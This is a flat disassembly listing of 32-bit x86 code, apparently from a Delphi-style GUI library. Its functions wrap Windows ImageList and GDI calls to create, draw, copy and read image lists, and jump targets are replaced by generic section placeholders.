call sub_424b98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456f10
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_456f2c
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax [ ebx + 0x34 ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
push esp
lea eax [ esp + 0x8 ]
push eax
push edx
call ImageList_GetIconSize
mov eax [ esp + 0x4 ]
mov [ ebx + 0x34 ] eax
mov eax [ esp ]
mov [ ebx + 0x30 ] eax
mov eax ebx
call sub_456e68
pop ecx
pop edx
pop ebx
retn
sub_456f64
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_456ff4
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_456f2c
mov [ ebx + 0x3c ] esi
mov eax ebx
mov si 0xffef
call sub_403350
sub_456fa0
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_457830
test ebx ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov eax ebx
call sub_427ce4
cmp al 0x1
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_456ff4
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_456e54
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x3c ] eax
mov eax ebx
mov si 0xffef
call sub_403350
pop esi
pop ebx
retn
cmp [ ebx + 0x42 ] 0x0
jne r-xdata
mov eax ebx
call sub_456f90
push eax
call ImageList_Destroy
sub_45702c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_4570bf
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x38 ]
push esi
push esi
xor eax eax
mov al [ ebx + 0x41 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xfe
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
call ImageList_Create
mov [ ebx + 0x3c ] eax
mov eax ebx
call sub_456e54
test al al
jne r-xdata
mov eax [ ebx + 0x44 ]
cmp eax 0x1fffffff
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4570c6
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
mov edx eax
mov eax ebx
call sub_457254
sub_4570cc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4276b0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45717b
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4276b0
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45715e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_456e5c
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_456fa0
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_456fa0
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457165
mov eax [ ebp - 0x10 ]
call sub_403154
retn
sub_457198
push ebx
mov ebx eax
mov eax ebx
call sub_456e54
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_456f90
push eax
call ImageList_GetImageCount
pop ebx
retn
sub_4571bc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45723b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_457198
cmp esi eax
jl r-xdata
mov eax ebx
call sub_456e54
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
mov eax ebx
mov si 0xffef
call sub_403350
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457242
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
push esi
mov eax ebx
call sub_456f90
push eax
call ImageList_Remove
sub_457254
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_456e54
test al al
je r-xdata
mov [ ebx + 0x44 ] esi
mov eax esi
call sub_456c50
push eax
mov eax [ ebx + 0x3c ]
push eax
call ImageList_SetBkColor
jmp r-xdata
mov eax ebx
mov si 0xffef
call sub_403350
pop esi
pop ebx
retn
sub_45728c
push ebx
mov ebx eax
mov eax ebx
call sub_456e54
test al al
je r-xdata
mov eax [ ebx + 0x44 ]
pop ebx
retn
mov eax ebx
call sub_456f90
push eax
call ImageList_GetBkColor
call sub_456c70
pop ebx
retn
sub_4572b4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
call sub_456e54
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebx + 0x54 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x48 ]
call sub_456c50
push eax
mov eax ebx
call sub_45728c
call sub_456c50
push eax
push 0x0
push 0x0
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax edi
call sub_424fb8
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_456f90
push eax
call ImageList_DrawEx
jmp r-xdata
mov eax [ ebx + 0x54 ]
call sub_427c78
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_4247f4
mov eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x34 ]
xor edx edx
xor eax eax
call sub_416f24
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebx + 0x54 ]
call sub_427c78
pop edx
call sub_424b98
push 0x0
push 0x0
push 0xffffffff
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x54 ]
call sub_427c78
call sub_424fb8
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_456f90
push eax
call ImageList_DrawEx
mov eax [ ebp + 0x10 ]
add eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
add ecx [ ebx + 0x34 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x14 ]
call sub_416f24
mov eax [ ebx + 0x54 ]
call sub_427c78
call sub_424fb8
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x14 ]
mov edx 0xff000014
call sub_4247f4
mov eax edi
call sub_424fb8
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
inc eax
push eax
mov eax [ ebp + 0x14 ]
inc eax
push eax
push esi
call BitBlt
mov eax [ edi + 0x14 ]
mov edx 0xff000010
call sub_4247f4
mov eax edi
call sub_424fb8
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push esi
call BitBlt
mov dl 0x1
mov eax [ r-xdata ]
call sub_4276b0
mov esi eax
mov [ ebx + 0x54 ] esi
mov dl 0x1
mov eax esi
call sub_4289e8
mov edx [ ebx + 0x34 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebx + 0x30 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
sub_457488
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov bl [ eax + 0x40 ]
push ebx
mov bl [ eax + 0x43 ]
push ebx
mov bl [ ebp + 0x8 ]
push ebx
call sub_4574ac
pop ebx
pop ebp
retn 0xc
sub_4574ac
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_456e54
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x14
push edi
mov eax [ ebp + 0x18 ]
push eax
xor eax eax
mov al [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebp + 0xc ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp + 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_4574f8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_416f24
mov eax [ ebp - 0x4 ]
call sub_45818c
xor eax eax
push ebp
push sub_457691
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4276b0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_457674
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4276b0
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_457657
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_4289e8
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x8 ]
push eax
call ImageList_GetImageCount
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45765e
mov eax [ ebp - 0x10 ]
call sub_403154
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0xc ]
call sub_427c78
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
call sub_424b98
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_424fb8
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
call sub_427c78
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_424b98
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
call sub_424fb8
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4570cc
cmp ebx edi
jne r-xdata
cmp edi 0xffffffff
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_4576a0
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_456f90
mov edx eax
or ecx 0xffffffff
mov eax ebx
call sub_4574f8
sub_4576c0
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov eax ebx
call sub_456ff4
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_418bac
mov eax ebx
call sub_457248
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_4578a8
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax esi
call sub_456f90
mov edx eax
mov eax ebx
call sub_456f2c
mov eax ebx
call sub_456e54
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_456f90
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_456e5c
jmp r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_456f90
push eax
call ImageList_GetBkColor
call sub_456c70
mov edx eax
mov eax ebx
call sub_457254
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov edx esi
mov eax ebx
call sub_4576a0
jmp r-xdata
sub_457780
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_418c90
pop esi
pop ebx
retn
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_4578a8
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov eax ebx
call sub_457248
mov eax esi
call sub_456f90
mov edx eax
mov eax ebx
call sub_456f2c
mov eax ebx
call sub_456e54
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_456f90
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_456e5c
jmp r-xdata
mov eax esi
call sub_456f90
push eax
call ImageList_GetBkColor
call sub_456c70
mov edx eax
mov eax ebx
call sub_457254
mov edx esi
mov eax ebx
call sub_4576a0
pop esi
pop ebx
retn
sub_457830
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45789c
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4578a3
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
cmp eax [ ebx + 0x30 ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a8
call sub_403908
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
cmp eax [ ebx + 0x34 ]
jge r-xdata
sub_4578d0
push ebx
push esi
push edi
push ebp
mov ebx eax
mov [ ebx + 0x58 ] 0x1
cmp [ ebx + 0x5c ] 0x0
jg r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
inc edi
xor ebp ebp
mov edx ebp
mov eax [ ebx + 0x4c ]
call sub_4185b0
mov si 0xffff
call sub_403350
inc ebp
dec edi
jne r-xdata
sub_457920
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
xor eax eax
mov [ ebp + 0x4 ] eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4184a0
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4185b0
cmp ebp eax
jne r-xdata
sub_457978
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_407dd8
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_4579bc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi edx
mov esi eax
test edi edi
je r-xdata
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax esi
call sub_457198
mov ebx eax
mov eax edi
call sub_457198
cmp ebx eax
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_457198
test eax eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_457a98
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_457a7b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_457978
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457a82
mov eax [ ebp - 0xc ]
call sub_403154
retn
mov eax edi
call sub_457198
test eax eax
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
sub_457aac
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_457198
test eax eax
setg al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4579bc
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_457b08
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_421344
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
push ebp
call sub_457aac
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_457b60
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax ebx
call sub_41acf0
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax ebx
call sub_41acf0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4276b0
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_457de4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41aac4
mov esi eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax [ ebp - 0x18 ]
add eax esi
cdq
push edx
push eax
mov eax ebx
call sub_41aae4
mov dl 0x1
mov eax [ r-xdata ]
call sub_4276b0
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_457dc7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4276b0
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4276b0
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_4289e8
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_416f24
mov eax [ ebp - 0x4 ]
call sub_45818c
xor eax eax
push ebp
push sub_457daa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x30 ]
cdq
idiv ecx
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457db1
mov eax [ ebp - 0xc ]
call sub_403154
mov eax [ ebp - 0x14 ]
call sub_403154
mov eax [ ebp - 0x4 ]
call sub_458190
retn
inc eax
mov [ ebp - 0x20 ] eax
xor edi edi
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x34 ]
cdq
idiv ecx
mov esi eax
dec esi
test esi esi
jl r-xdata
inc edi
dec [ ebp - 0x20 ]
jne r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_416f4c
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_427c78
push eax
mov eax [ ebp - 0xc ]
call sub_427c78
lea edx [ ebp - 0x30 ]
pop ecx
call sub_424a64
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_416f4c
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_427c78
push eax
mov eax [ ebp - 0x14 ]
call sub_427c78
lea edx [ ebp - 0x30 ]
pop ecx
call sub_424a64
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4570cc
dec [ ebp - 0x1c ]
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_457df4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_421ac4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_457e54
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_456f64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457e5b
mov eax [ ebp - 0xc ]
call sub_403154
retn
sub eax 0xffffffec
sub_457e5b
mov eax [ ebp - 0x4 ]
call sub_456e54
test al al
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ebx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_457f8a
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_41aae4
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_41b250
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_41aae4
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x11 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403154
retn
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_41aae4
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_421ac4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_457f6d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x38
mov eax [ ebp - 0x10 ]
call sub_41aae4
lea edx [ ebp - 0x12 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_456f64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403154
retn
sub eax 0xffffffec
mov al [ ebp - 0x12 ]
or [ ebp - 0x11 ] al
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_41aae4
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
dec eax
sete bl
sub_457fbc
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
call sub_456ff4
mov eax edi
call sub_41aac4
mov [ esp + 0xc ] eax
mov edx esp
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
mov bl [ esp ]
and bl 0xff
mov ax [ esp ]
shr ax 0x8
mov [ esp + 0x8 ] al
mov eax [ esp + 0xc ]
cdq
push edx
push eax
mov eax edi
call sub_41aae4
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx edi
mov eax esi
call sub_457b60
cmp bl 0x49
jne r-xdata
cmp [ esp + 0x8 ] 0x4c
jne r-xdata
mov edx edi
mov eax esi
call sub_457df4
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_458048
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_421ac4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_458142
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax r-xdata
call sub_40bef8
mov [ rw-data ] eax
cmp [ rw-data ] 0x60000
jb r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push r-xdata
call GetModuleHandleA
mov edi eax
test edi edi
je r-xdata
push eax
